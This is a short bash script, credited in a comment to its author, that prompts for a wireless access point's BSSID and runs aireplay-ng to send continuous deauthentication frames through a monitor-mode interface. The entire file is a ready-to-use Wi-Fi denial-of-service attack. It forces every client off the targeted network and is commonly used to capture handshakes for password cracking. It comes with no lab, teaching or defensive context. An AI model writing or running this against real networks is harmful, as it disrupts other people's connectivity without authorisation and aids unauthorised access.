#!/bin/bash
#sandesh yadav
read -p "Enter the BSSID > " bssid
aireplay-ng -0 0 -a $bssid wlan0mon
